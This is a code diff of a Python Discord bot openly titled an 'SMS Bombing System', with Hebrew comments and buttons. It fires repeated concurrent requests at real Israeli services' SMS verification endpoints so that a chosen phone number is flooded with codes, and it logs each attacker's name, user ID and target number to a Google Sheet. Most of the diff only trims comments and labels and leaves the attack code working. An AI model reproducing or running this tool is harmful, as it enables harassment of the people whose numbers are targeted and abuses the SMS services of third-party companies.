@@ -21,14 +21,14 @@ class CyberBot(commands.Bot):
 
     async def setup_hook(self):
         await self.tree.sync()
-        print(f"✅ Commands Synced")
 
 bot = CyberBot()
 
-# --- מערכת הלוגים לשייטס ---
+# --- פונקציית הלוג לשייטס החדש ---
 def send_to_sheet(user_name, user_id, phone, rounds, success, failed):
     if not GSHEET_URL:
         return
+    # חשוב: שמות המפתחות כאן חייבים להתאים למה שכתבנו ב-Apps Script
     payload = {
         "user_name": user_name,
         "user_id": str(user_id),
@@ -38,14 +38,14 @@ def send_to_sheet(user_name, user_id, phone, rounds, success, failed):
         "failed_count": failed
     }
     try:
-        requests.post(GSHEET_URL, json=payload, timeout=8)
+        requests.post(GSHEET_URL, json=payload, timeout=10)
     except:
         print("❌ GSheet Log Error")
 
-# --- מנוע ה-API (6 מקורות) ---
+# --- מנוע ה-API ---
 def api_request(url, payload, is_json=True):
     try:
-        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
+        headers = {"User-Agent": "Mozilla/5.0"}
         if is_json:
             r = requests.post(url, json=payload, headers=headers, timeout=4)
         else:
@@ -55,7 +55,6 @@ def api_request(url, payload, is_json=True):
         return False
 
 async def fire_round(phone):
-    # רשימת המשימות לשליחה במקביל
     tasks = [
         asyncio.to_thread(api_request, "https://users-auth.hamal.co.il/auth/send-auth-code", {"value": phone, "type": "phone", "projectId": "1"}),
         asyncio.to_thread(api_request, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", {"phoneNumber": phone}),
@@ -74,55 +73,47 @@ async def start_attack(interaction, phone, rounds):
     active_attacks[uid] = True
     
     total_s, total_f = 0, 0
+    rounds_int = int(rounds)
     
-    for i in range(int(rounds)):
+    for i in range(rounds_int):
         if not active_attacks.get(uid):
             break
         
         s, f = await fire_round(phone)
         total_s += s
         total_f += f
-        await asyncio.sleep(2) # השהייה קלה למניעת חסימות IP
+        await asyncio.sleep(2)
     
-    # שליחת לוג בסיום/עצירה
-    send_to_sheet(uname, uid, phone, rounds, total_s, total_f)
+    # שליחת הלוג לסיום/עצירה לגיליון החדש
+    send_to_sheet(uname, uid, phone, rounds_int, total_s, total_f)
     active_attacks.pop(uid, None)
 
-# --- ממשק דיסקורד (Buttons & Modals) ---
+# --- ממשק דיסקורד ---
 class AttackControl(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
 
-    @discord.ui.button(label="🚀 התחל הפצצה", style=discord.ButtonStyle.danger, custom_id="btn_start")
+    @discord.ui.button(label="🚀 התחל הפצצה", style=discord.ButtonStyle.danger)
     async def start_button(self, interaction: discord.Interaction, button: discord.ui.Button):
         class BombModal(discord.ui.Modal, title="CyberIL - SMS Launcher"):
-            phone = discord.ui.TextInput(label="מספר טלפון (10 ספרות)", placeholder="05XXXXXXXX", min_length=10, max_length=10)
-            rounds = discord.ui.TextInput(label="כמות סיבובים (בכל סיבוב 6 SMS)", default="10")
-            
+            phone = discord.ui.TextInput(label="מספר טלפון", min_length=10, max_length=10)
+            rounds = discord.ui.TextInput(label="כמות סיבובים", default="10")
             async def on_submit(self, modal_inter: discord.Interaction):
-                await modal_inter.response.send_message(f"💣 ההפצצה על {self.phone.value} יצאה לדרך!", ephemeral=True)
+                await modal_inter.response.send_message(f"💣 הפצצה על {self.phone.value} החלה!", ephemeral=True)
                 asyncio.create_task(start_attack(modal_inter, self.phone.value, self.rounds.value))
-        
         await interaction.response.send_modal(BombModal())
 
-    @discord.ui.button(label="🛑 עצור הכל", style=discord.ButtonStyle.secondary, custom_id="btn_stop")
+    @discord.ui.button(label="🛑 עצור", style=discord.ButtonStyle.secondary)
     async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
         if interaction.user.id in active_attacks:
             active_attacks[interaction.user.id] = False
-            await interaction.response.send_message("🚨 פקודת עצירה התקבלה. התהליך יופסק בסיום הסיבוב הנוכחי.", ephemeral=True)
+            await interaction.response.send_message("🚨 עוצר...", ephemeral=True)
         else:
-            await interaction.response.send_message("אין לך הפצצה פעילה כרגע.", ephemeral=True)
+            await interaction.response.send_message("אין הפצצה פעילה.", ephemeral=True)
 
-@bot.tree.command(name="setup", description="הצגת לוח הבקרה של הבוט")
+@bot.tree.command(name="setup", description="לוח בקרה")
 async def setup(interaction: discord.Interaction):
-    embed = discord.Embed(title="⚡ CyberIL - SMS Bombing System", color=0x2f3136)
-    embed.add_field(name="סטטוס מערכת", value="🟢 מחובר ל-API\n🟢 לוגים פעילים", inline=False)
-    embed.set_footer(text="Admin Panel v2.0")
+    embed = discord.Embed(title="⚡ CyberIL SMS System", color=0x000000)
     await interaction.response.send_message(embed=embed, view=AttackControl())
 
-@bot.event
-async def on_ready():
-    print(f'Logged in as {bot.user}')
-
-if __name__ == "__main__":
-    bot.run(TOKEN)
+bot.run(TOKEN)
